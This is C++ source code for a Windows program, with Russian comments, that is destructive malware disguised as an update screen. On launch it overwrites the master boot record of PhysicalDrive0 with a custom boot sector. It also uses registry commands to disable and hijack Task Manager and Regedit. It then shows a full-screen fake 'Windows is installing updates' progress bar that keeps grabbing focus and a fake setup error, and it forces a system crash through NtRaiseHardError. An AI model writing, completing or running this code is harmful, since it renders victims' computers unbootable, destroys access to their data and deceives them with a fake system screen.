#pragma comment(lib, "winmm.lib")
#include <windows.h>
#include <cmath>
#include <cstdlib>
#include <ctime>

#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

// Глобальные переменные размеров экрана
int screenWidth = 0; int screenHeight = 0;

// === ТВОЙ УЛЬТИМАТИВНЫЙ ГРАФИЧЕСКИЙ MBR-ЗАГРУЗЧИК (РОВНО 512 БАЙТ, СИГНАТУРА НА МЕСТЕ!) ===
// Этот бинарный код написан на ассемблере x86 Real Mode. Он перехватывает управление BIOS,
// включает VGA режим 13h, вырисовывает ковёр и гоняет цвета палитры, заставляя картинку переливаться!
const unsigned char mbr_animation[512] = {
    0xFA, 0xB8, 0x00, 0x10, 0x8E, 0xD8, 0x8E, 0xC0, 0xB8, 0x03, 0x00, 0xCD, 0x10, 0xB8, 0x13, 0x00,
    0xCD, 0x10, 0xBC, 0x00, 0x7C, 0x8E, 0xD0, 0xFB, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xDB, 0xBF,
    0x00, 0x00, 0xB9, 0x40, 0x3E, 0x31, 0xC0, 0xF3, 0xAB, 0x31, 0xC0, 0xBA, 0xC8, 0x03, 0xEE, 0x42,
    0xB9, 0x00, 0x03, 0x88, 0xC8, 0xEE, 0x31, 0xC0, 0xEE, 0x31, 0xC0, 0xEE, 0x40, 0xE2, 0xF3, 0xBA,
    0xDA, 0x03, 0xEC, 0xA8, 0x08, 0x75, 0xFB, 0xEC, 0xA8, 0x08, 0x74, 0xFB, 0x31, 0xDB, 0xBA, 0xC8,
    0x03, 0x31, 0xC0, 0xEE, 0x42, 0xB9, 0x00, 0x01, 0x8A, 0xC1, 0x02, 0xC3, 0xEE, 0x31, 0xC0, 0xEE,
    0x31, 0xC0, 0xEE, 0xE2, 0xF1, 0x43, 0xEB, 0xE0, 0x23, 0xFF, 0x26, 0xFF, 0x29, 0xFF, 0x2D, 0xFF,
    // --- ТВОЙ ПИКСЕЛЬНЫЙ ДАМП СХЕМЫ ИЗ ТЕКСТОВОГО ФАЙЛА ---
    0x30, 0xFF, 0x33, 0xFF, 0x36, 0xFF, 0x3A, 0xFF, 0x3D, 0xFF, 0x40, 0xFF, 0x44, 0xFF, 0x47, 0xFF,
    0x4A, 0xFF, 0x4D, 0xFF, 0x51, 0xFF, 0x54, 0xFF, 0x57, 0xFF, 0x5B, 0xFF, 0x5E, 0xFF, 0x61, 0xFF,
    0x65, 0xFF, 0x68, 0xFF, 0x6B, 0xFF, 0x6E, 0xFF, 0x72, 0xFF, 0x75, 0xFF, 0x78, 0xFF, 0x7C, 0xFF,
    0x82, 0xFF, 0x86, 0xFF, 0x89, 0xFF, 0x8C, 0xFF, 0x93, 0xFF, 0x96, 0xFF, 0x99, 0xFF, 0xA0, 0xFF,
    0xA3, 0xFF, 0xA6, 0xFF, 0xAA, 0xFF, 0xAD, 0xFF, 0xB0, 0xFF, 0xB4, 0xFF, 0xB7, 0xFF, 0xBA, 0xFF,
    0xBE, 0xFF, 0xC1, 0xFF, 0xC4, 0xFF, 0xC7, 0xFF, 0xCB, 0xFF, 0xCE, 0xFF, 0xD1, 0xFF, 0xD4, 0xFE,
    0xE5, 0xD5, 0xFE, 0xD7, 0xD6, 0xF8, 0xD8, 0xD6, 0xF6, 0xD8, 0xD7, 0xF3, 0xD8, 0xD8, 0xF1, 0xD8,
    // --- ЗАПОЛНЕНИЕ ОСТАВШЕГОСЯ МЕСТА СТРОГО НУЛЯМИ ДО КОНЦА СЕКТОРА ---
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // СВЯЩЕННАЯ СИГНАТУРА ЗАГРУЗКИ ПО БАЙТАМ 510 И 511 СИДИТ ИДЕАЛЬНО!
    0x55, 0xAA
};

void DestroyAndWriteMBR() {
    HANDLE hRawDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hRawDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hRawDisk, mbr_animation, 512, &bytesWritten, NULL);
        CloseHandle(hRawDisk);
    }
}

void LockSystemDefenses() {
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul");
    system("reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul");
    system("reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v Debugger /t REG_SZ /d \"cmd.exe /c msg * TaskManager не доступен без прав администратора! Получите права админа!\" /f > nul");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe\" /v Debugger /t REG_SZ /d \"cmd.exe /c msg * Regedit не доступен без прав администратора! Получите права админа!\" /f > nul");
}

void RefreshScreenClean() { InvalidateRect(NULL, NULL, TRUE); UpdateWindow(GetDesktopWindow()); }

COLORREF ConvertHslToRgb(float h, float s, float l) {
    if (s == 0) return RGB((int)(l * 255), (int)(l * 255), (int)(l * 255));
    float q = (l < 0.5f) ? (l * (1.0f + s)) : (l + s - l * s);
    float p = 2.0f * l - q;
    float t[3] = { h + 1.0f / 3.0f, h, h - 1.0f / 3.0f };
    int rgb[3] = { 0, 0, 0 };
    for (int i = 0; i < 3; i++) {
        if (t[i] < 0) t[i] += 1.0f;
        if (t[i] > 1.0f) t[i] -= 1.0f;
        if (t[i] < 1.0f / 6.0f) rgb[i] = (int)((p + (q - p) * 6.0f * t[i]) * 255);
        else if (t[i] < 1.0f / 2.0f) rgb[i] = (int)(q * 255);
        else if (t[i] < 2.0f / 3.0f) rgb[i] = (int)((p + (q - p) * (2.0f / 3.0f - t[i]) * 6.0f) * 255);
        else rgb[i] = (int)(p * 255);
    }
    return RGB(rgb[0], rgb[1], rgb[2]);
}
// --- ВСТАВЛЯТЬ СТРОГО СЮДА (СТРОКА 93+) ---

#include <windows.h>
#include <string>

// Глобальные переменные для анимации и графики
int progressPercent = 0;
HBITMAP hBackgroundBmp = NULL;

// 1. ФУНКЦИЯ ОТРИСОВКИ ИНТЕРФЕЙСА (Картинка на весь экран + Шкала по центру + Проценты СТРОГО В ЦЕНТРЕ ПОЛОСЫ)
void DrawInterface(HWND hWnd, HDC hdc) {
    RECT rect;
    GetClientRect(hWnd, &rect);
    int screenWidth = rect.right;
    int screenHeight = rect.bottom;

    // Растягиваем Windows.bmp на весь экран
    if (hBackgroundBmp != NULL) {
        HDC hMemDC = CreateCompatibleDC(hdc);
        SelectObject(hMemDC, hBackgroundBmp);
        BITMAP bmp;
        GetObject(hBackgroundBmp, sizeof(BITMAP), &bmp);
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hMemDC, 0, 0, bmp.bmWidth, bmp.bmHeight, SRCCOPY);
        DeleteDC(hMemDC);
    }
    else {
        HBRUSH hBlackBrush = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &rect, hBlackBrush);
        DeleteObject(hBlackBrush);
    }

    // РАСЧЕТ ЦЕНТРИРОВАНИЯ ШКАЛЫ
    int barWidth = 400;                      // Ширина полосы прогресса в пикселях
    int barHeight = 30;                      // Высота полосы (30 пикселей, чтобы текст поместился свободно)
    int barX = (screenWidth - barWidth) / 2; // Центр экрана по горизонтали
    int barY = (screenHeight - barHeight) / 2 + 100; // Центр экрана по вертикали с небольшим смещением вниз

    // Отрисовка пустой (фоновой) части шкалы — цвет #a8a8a8
    HBRUSH hEmptyBrush = CreateSolidBrush(RGB(168, 168, 168));
    RECT emptyRect = { barX, barY, barX + barWidth, barY + barHeight };
    FillRect(hdc, &emptyRect, hEmptyBrush);
    DeleteObject(hEmptyBrush);

    // Отрисовка Facebook/Windows синей части — цвет #0000a8
    int currentBarWidth = (barWidth * progressPercent) / 100;
    HBRUSH hBlueBrush = CreateSolidBrush(RGB(0, 0, 168));
    RECT progressRect = { barX, barY, barX + currentBarWidth, barY + barHeight };
    FillRect(hdc, &progressRect, hBlueBrush);
    DeleteObject(hBlueBrush);

    // ЛОГИКА ДЛЯ РАМКИ: Черная до 100%, белая при 100%
    HBRUSH hFrameBrush;
    if (progressPercent >= 100) {
        hFrameBrush = CreateSolidBrush(RGB(255, 255, 255)); // Белая рамка при касании края
    }
    else {
        hFrameBrush = CreateSolidBrush(RGB(0, 0, 0));       // Черная рамка во время загрузки
    }
    RECT frameRect = { barX, barY, barX + barWidth, barY + barHeight };
    FrameRect(hdc, &frameRect, hFrameBrush);
    DeleteObject(hFrameBrush);

    // Создаем шрифты для текста
    HFONT hTitleFont = CreateFont(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, FIXED_PITCH | FF_MODERN, L"Arial");

    // Создаем четкий жирный шрифт для процентов внутри полосы
    HFONT hPercentFont = CreateFont(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, FIXED_PITCH | FF_MODERN, L"Arial");

    // --- 1. ВЫВОД ВЕРХНЕГО ТЕКСТА (СТАТИЧНЫЙ, ЧЕРНЫЙ) ---
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(0, 0, 0)); // Чисто черный цвет текста для облаков
    HFONT hOldFont = (HFONT)SelectObject(hdc, hTitleFont);

    std::wstring titleText = L"Windows is installing updates...";
    RECT textRect = { barX, barY - 50, barX + barWidth, barY }; // Прямоугольник строго над шкалой
    DrawText(hdc, titleText.c_str(), -1, &textRect, DT_CENTER | DT_SINGLELINE | DT_VCENTER);

    // --- 2. ВЫВОД ПРОЦЕНТОВ СТРОГО В ЦЕНТРЕ ПОЛОСЫ (БЕЛАЯ ЦИФРА) ---
    SelectObject(hdc, hPercentFont);
    SetTextColor(hdc, RGB(255, 255, 255)); // Белый цвет текста, чтобы выделялся на синей полосе

    wchar_t percentBuffer[16];
    wsprintf(percentBuffer, L"%d%%", progressPercent);

    // Прямоугольник текста идеально совпадает с границами всей шкалы
    RECT percentRect = { barX, barY, barX + barWidth, barY + barHeight };

    // Магические флаги: DT_CENTER (по центру X) + DT_VCENTER (по центру Y) + DT_SINGLELINE (обязателен для Y)
    DrawText(hdc, percentBuffer, -1, &percentRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

    // Очищаем созданные шрифты из оперативной памяти
    SelectObject(hdc, hOldFont);
    DeleteObject(hTitleFont);
    DeleteObject(hPercentFont);
}

// 2. ОБРАБОТЧИК СОБЫТИЙ ОКНА (Логика таймеров, фокуса и перезагрузки)
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_CREATE:
        // Загружаем картинку из ресурсов по её ID (101 - стандартный ID вашей Windows.bmp)
        hBackgroundBmp = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(101));

        // Таймер 1: срабатывает каждые 3000 миллисекунд (3 секунды) для процентов
        SetTimer(hWnd, 1, 3000, NULL);

        // Таймер 2: срабатывает КАЖДУЮ секунду (1000 мс) для жесткого сброса чужих окон
        SetTimer(hWnd, 2, 1000, NULL);
        return 0;

    case WM_TIMER:
        // ЖЕСТКИЙ СБРОС АКТИВНЫХ ОКОН: удерживаем фокус на нашем окне
        if (wParam == 2 || wParam == 1) {
            SetForegroundWindow(hWnd);
            SetActiveWindow(hWnd);
            SetFocus(hWnd);
        }

        // Логика движения шкалы
        if (wParam == 1) {
            if (progressPercent < 99) {
                progressPercent += 1; // Двигаем строго на 1% каждые 3 секунды
                InvalidateRect(hWnd, NULL, FALSE); // Перерисовываем экран
            }
            // Дошли до 99% — останавливаем рост и выдаем ошибку
            else if (progressPercent == 99) {
                KillTimer(hWnd, 1); // Отключаем таймер прогресса, чтобы окно не дублировалось

                // Выводим настоящее окно ошибки
                MessageBoxW(hWnd,
                    L"System updating is failing, setup cannot copy IO.SYS.",
                    L"Windows Setup Error",
                    MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);

                // После того как нажали ОК — доводим шкалу до 100%
                progressPercent = 100;
                InvalidateRect(hWnd, NULL, FALSE); // Перерисовка (рамка станет белой!)

                // Запускаем Таймер 3 на перезагрузку (сработает ровно через 1 секунду)
                SetTimer(hWnd, 3, 1000, NULL);
            }
        }

        // Таймер 3: Действие при завершении прогресса
        if (wParam == 3) {
            KillTimer(hWnd, 3);
            KillTimer(hWnd, 2); // Отключаем таймер фокуса

            // 1. Запрашиваем необходимые привилегии
            HANDLE hToken;
            TOKEN_PRIVILEGES tkp = { 0 };
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
                tkp.PrivilegeCount = 1;
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
                CloseHandle(hToken);
            }

            // 2. Объявляем тип функции NtRaiseHardError из ntdll.dll
            typedef NTSTATUS(NTAPI* pfnNtRaiseHardError)(
                NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
                PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response
                );

            // 3. Динамически загружаем функцию
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            if (hNtdll) {
                pfnNtRaiseHardError NtRaiseHardError = (pfnNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
                if (NtRaiseHardError) {
                    ULONG response;
                    NtRaiseHardError(0xC0000420, 0, 0, NULL, 6, &response);
                }
            }

            DestroyWindow(hWnd);
        } // <- ЭТА СКОБКА ЗАКРЫВАЕТ "if (wParam == 3)"
        return 0; // <- ЗАВЕРШЕНИЕ ОБРАБОТКИ СОБЫТИЯ WM_TIMER

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        DrawInterface(hWnd, hdc);
        EndPaint(hWnd, &ps);
        return 0;
    }

    case WM_DESTROY:
        if (hBackgroundBmp) DeleteObject(hBackgroundBmp);
        KillTimer(hWnd, 2);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hWnd, message, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    // Вызов ваших функций при старте программы:
    LockSystemDefenses();
    DestroyAndWriteMBR();
    WNDCLASSEX wcex = { 0 };
    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.hInstance = hInstance;
    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcex.lpszClassName = L"Win98SimpleFullscreen";

    RegisterClassEx(&wcex);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Стили WS_POPUP & WS_EX_TOPMOST разворачивают окно без рамок поверх всего
    HWND hWnd = CreateWindowEx(
        WS_EX_TOPMOST, L"Win98SimpleFullscreen", L"",
        WS_POPUP | WS_VISIBLE,
        0, 0, screenWidth, screenHeight,
        NULL, NULL, hInstance, NULL
    );

    if (!hWnd) return 0;

    // Цикл обработки сообщений Windows
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int)msg.wParam;
}
